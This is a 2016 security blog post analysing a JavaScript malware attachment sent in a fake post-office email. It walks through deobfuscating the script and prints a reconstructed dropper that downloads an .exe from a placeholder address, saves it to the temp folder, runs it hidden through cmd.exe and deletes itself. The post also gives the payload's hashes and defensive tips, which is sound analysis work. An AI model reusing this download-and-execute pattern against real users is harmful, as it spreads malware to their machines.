<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!">
    <meta name="author" content="W3ndige">
    <title>Analyzing JavaScript Malware - Root Network Security</title>

    <link rel="canonical" href="http://localhost:4000/2016/10/29/analyzing-javascript-malware/">
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/css/bootstrap.min.css">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/clean-blog.css">

    <!-- Pygments Github CSS -->
    <link rel="stylesheet" href="/css/syntax.css">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href="//https://fonts.googleapis.com/css?family=Nunito:400,700i" rel="stylesheet">
    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->


    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Root Network Security" />

</head>


<body>

    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">Root Network Security</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                <li>
                    <a href="/about/">About</a>
                </li>

                <li>
                    <a href="/archive/">Archive</a>
                </li>

                <li>
                    <a href="/contact/">Contact</a>
                </li>

                <li>
                    <a href="/projects/">Projects</a>
                </li>

                <li>
                    <a href="/resources/">Resources</a>
                </li>
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>


    <!-- Post Header -->
<header class="intro-header" style="background-image: url('/img/analyzing-javascript-malware-header.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <h1>Analyzing JavaScript Malware</h1>
                    
                    <h2 class="subheading">Quick Story Behind Spam Attachment</h2>
                    
                    <span class="meta">Posted by W3ndige on October 29, 2016</span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">

				<h1>Backstory</h1>

<p>About half of a year ago, my girlfriend got e-mail from post office saying that the the package was ready to pickup, with a quick note saying that more information is available in the attachment. I was asked to look at it, as she found it suspicious - mail was written very poorly - definitely not what official mail would sound like. Firstly I took a look at the domain, from where this mail was sent, and as I excepted, it was not connected to domains of our post service. But what I really wanted to know was, what's the goal of the attachment? </p>

<h1>First contact</h1>

<p>After downloading it, I noticed that the extension of the file was <b>.js</b> - some JavaScript file. But it was only possible because I had turned on showing files with their extensions. Someone without this option would see it only as .txt file. Viewing the source, unfortunately at first, gave me no clue how it works. Script was made of around 400 lines of code. But after looking closer it seemed, that around quarter of the code was actually part that did something, rest was only filled with assigned variables and functions returning pieces of words. </p>

<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">tbuloq1</span> <span class="o">=</span> <span class="p">{</span>
	<span class="na">itxy</span><span class="p">:</span><span class="s1">'plebydva'</span><span class="p">,</span> <span class="mi">8423</span><span class="p">:</span><span class="mi">730</span><span class="p">,</span> <span class="na">ldipli</span><span class="p">:</span><span class="mi">353</span><span class="p">,</span> <span class="na">lgahze</span><span class="p">:</span><span class="s2">"AtEn"</span><span class="p">,</span> <span class="na">ekxov</span><span class="p">:</span><span class="s1">'dipyvvo'</span>
<span class="p">}</span>
<span class="p">[</span><span class="s2">"lgahze"</span><span class="p">];</span>
<span class="kd">function</span> <span class="nx">daqkuvtejqa3</span> <span class="p">()</span> <span class="p">{</span>
           <span class="kd">var</span> <span class="nx">ssororg0</span> <span class="o">=</span> <span class="p">{</span>
		<span class="na">lifki</span><span class="p">:</span><span class="s1">'hylxyzra'</span><span class="p">,</span> <span class="mi">2216</span><span class="p">:</span><span class="s2">"d"</span><span class="p">,</span> <span class="mi">6034</span><span class="p">:</span><span class="s1">'ubylivw'</span>
	<span class="p">}</span>
	<span class="p">;</span>
	<span class="kd">var</span> <span class="nx">xhahbolz3</span> <span class="o">=</span> <span class="nx">ssororg0</span><span class="p">[</span><span class="s2">"2216"</span><span class="p">];</span>
           <span class="k">return</span> <span class="nx">xhahbolz3</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>But after some time I noticed a pattern - in last 30 lines of code, there were only references to the variables, and after connecting them together what I got, was much more readable than before. In example, if you take this piece of code and connect to the variables in the beggining, what you'll get is something more likely looking like this. </p>

<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">ejybpib6</span><span class="o">=</span> <span class="nx">zoracufyp7</span><span class="p">[</span><span class="nx">nsatqe9</span> <span class="o">+</span> <span class="nx">oxqokowj9</span> <span class="o">+</span> <span class="nx">ynxyru7</span> <span class="o">+</span> <span class="nx">exgemko2</span><span class="p">];</span></code></pre></figure>

<p>Great, now to make it clearer to read I have to do the same. Unfortunately I'm not completely sure that it's 'translated' 100% correctly, but it still gives me insight into how this script may work. </p>

<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">ejybpib6</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">WScript</span><span class="p">;</span></code></pre></figure>

<p>Finally, after around 3 hours, I got the full translation. But I've got still a few questions, what is WScript and how it works? </p>

<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">ejybpib6</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">WScript</span><span class="p">;</span>
<span class="nx">ehynzedda7</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">Scripting</span><span class="p">.</span><span class="nx">FileSystemObject</span><span class="p">);</span>
<span class="nx">elmona4</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">WScript</span><span class="p">.</span><span class="nx">Shell</span><span class="p">);</span>
<span class="nx">acjihy9</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">MSXML2</span><span class="p">.</span><span class="nx">XMLHTTP</span><span class="p">);</span>
<span class="nx">jyfej9</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">ADODB</span><span class="p">.</span><span class="nx">Stream</span><span class="p">);</span>
<span class="nx">oqavate7</span> <span class="o">=</span> <span class="nx">ehynzedda7</span><span class="p">.</span><span class="nx">GetSpecialFolder</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">document</span> <span class="o">==</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">kagignu5</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">Scripting</span><span class="p">.</span><span class="nx">FileSystemObject</span><span class="p">).</span><span class="nx">GetTempName</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="k">typeof</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">StdIn</span><span class="p">.</span><span class="nx">AtEndOfStream</span> <span class="o">==</span> <span class="nx">unknown</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">ixzebni1</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">MSXML2</span><span class="p">.</span><span class="nx">XMLHTTP</span><span class="p">).</span><span class="nx">open</span><span class="p">(</span><span class="nx">GET</span><span class="p">,</span> <span class="s1">'http://some_ip_address/8899.exe'</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="nx">ixzebni1</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">MSXML2</span><span class="p">.</span><span class="nx">XMLHTTP</span><span class="p">).</span><span class="nx">send</span><span class="p">();</span>
<span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">ADODB</span><span class="p">.</span><span class="nx">Stream</span><span class="p">).</span><span class="nx">type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">try</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">WScript</span><span class="p">.</span><span class="nx">Arguments</span><span class="p">.</span><span class="nx">Unnamed</span><span class="p">.</span><span class="nx">length</span><span class="p">])</span> <span class="p">{</span>
			<span class="nx">oxacobmo3</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">MSXML2</span><span class="p">.</span><span class="nx">XMLHTTP</span><span class="p">).</span><span class="nx">ResponseBody</span><span class="p">;</span>
		<span class="p">}</span>
    <span class="nx">ruzetpa0</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">ScriptFullName</span><span class="p">;</span>
    <span class="nx">ixzebni1</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">ADODB</span><span class="p">.</span><span class="nx">Stream</span><span class="p">)</span><span class="nx">Open</span><span class="p">();</span>
    <span class="nx">ixzebni1</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">ADODB</span><span class="p">.</span><span class="nx">Stream</span><span class="p">).</span><span class="nx">Write</span><span class="p">(</span><span class="nx">oxacobmo3</span><span class="p">);</span>
    <span class="nx">ixzebni1</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">ADODB</span><span class="p">.</span><span class="nx">Stream</span><span class="p">).</span><span class="nx">SaveToFile</span><span class="p">(</span><span class="nx">oqavate7</span> <span class="o">+</span> <span class="nx">kagignu5</span><span class="p">);</span>
    <span class="nx">ixzebni1</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">ADODB</span><span class="p">.</span><span class="nx">Stream</span><span class="p">).</span><span class="nx">Close</span><span class="p">();</span>
    <span class="nx">ixzebni1</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">WScript</span><span class="p">.</span><span class="nx">Shell</span><span class="p">).</span><span class="nx">run</span><span class="p">(</span><span class="nx">cmd</span><span class="p">.</span><span class="nx">exe</span> <span class="o">/</span><span class="nx">c</span> <span class="o">+</span> <span class="nx">oqavate7</span> <span class="o">+</span> <span class="nx">kagignu5</span><span class="p">,</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nx">ixzebni1</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">CreateObject</span><span class="p">(</span><span class="nx">Scripting</span><span class="p">.</span><span class="nx">FileSystemObject</span><span class="p">).</span><span class="nx">deleteFile</span><span class="p">(</span><span class="nx">ruzetpa0</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
<span class="p">}</span></code></pre></figure>

<p>Okay, as far as I can understand, it downloads the file from url (not shown in this code), and somehow executes it, maybe using cmd?  But for better insight I had to dig for references showing the use of the WScript and other functions show in this code. </p>

<h1>Understanding</h1>

<p><b>Windows Host Script</b> is an Windows eviroment, providing the user with a possibility to run scripts in a variety of languages. By default, when JavaScript is saved to your hard drive, it will be run by WSH with power of executable file. </p>

<p>Script uses these WScript calls: </p>

<ul>
<li><b>WScript.CreateObject(WScript.Shell)</b> - provides access to shell methods of operating system.</li>
<li><b>WScript.CreateObject(MSXML2.XMLHTTP)</b> - XML request using HTTP.</li>
<li><b>WScript.CreateObject(ADODB.Stream)</b> - is used to represent a stream of data or text.</li>
</ul>

<p><b>GetSpecialFolder(2)</b> will get the %TEMP% folder. </p>

<p>Then the script creates the XML request to get the data from specified URL and, then it sends the request. </p>

<p>After that script creates a series of commands to: </p>

<ol>
<li>Get the response body of the request. </li>
<li>Write it to a file in tmp directory. </li>
<li>Save and close the file. </li>
<li>Execute through CMD</li>
<li>Lastly, it will delete the file. </li>

</ol>

<p>Unfortunately, .exe file was not available, while I got to check, and I couldn't find as much info about it as I wanted. The only information I could find were: </p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Operating System: Windows 7 / 8 / 8.1 / 10
Singature Name: QVM07.1.Malware.Gen

Main Info:

Name: 8899.exe

Size: 569464

Type: PE32 executable (GUI) Intel 80386, for MS Windows

MD5: 3771453fc565a0436534d509dcb7da9f

SHA1: 803e3634a70dd3b9ce2b409b108cb1baf5fa3d08

Freezing computer.
New home page in browsers.
Ads and pop-ups on desktop and browser.
Very slow loading speed of webpages.
Computer work slower then usual.</code></pre></figure>

<h1>Conclusion</h1>

<p>Author of this malware did a lot, to try and obfuscate this script, as I spent a lot of time trying to make it readable, but still it wasn't as complicated as I thought at first. To stay protected from these kinds of attacks, remember to tell explorer to open .js files through the Notepad by default, as well as show files with their extensions. That way you will see if it's really a text document or .txt.js malware. And the most important step, don't download files that you're unsure about. Simply, don't trust anyone ;) </p>

<p>I had great fun, trying to understand the concept, and even though you may think, that it was very simple, I still learned a lot from this. Anyway, thanks for reading, I hope you learned something new, and I'll see you in the next one! </p>

<p>~ Stay safe!</p>


                <hr>

                <ul class="pager">
                    
                    <li class="previous">
                        <a href="/2016/10/26/web-application-security-intro/" data-toggle="tooltip" data-placement="top" title="Web Application Security">&larr; Previous Post</a>
                    </li>
                    
                    
                    <li class="next">
                        <a href="/2016/11/19/overthewire.org-krypton/" data-toggle="tooltip" data-placement="top" title="Overthewire.org - Krypton">Next Post &rarr;</a>
                    </li>
                    
                </ul>

            </div>
        </div>
    </div>
</article>

<hr>


    <!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    <li>
                        <a href="/feed.xml">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    <li>
                        <a href="https://github.com/w3ndige">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li>
                        <a href="mailto:w3ndige@protonmail.com">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
                <p class="copyright text-muted">Copyright &copy; RootNetSec 2016 - 2017</p>
            </div>
        </div>
    </div>
</footer>

<!-- jQuery -->
<script src="/js/jquery.min.js "></script>

<!-- Bootstrap Core JavaScript -->
<script src="/js/bootstrap.min.js "></script>

<!-- Custom Theme JavaScript -->
<script src="/js/clean-blog.min.js "></script>


</body>

</html>
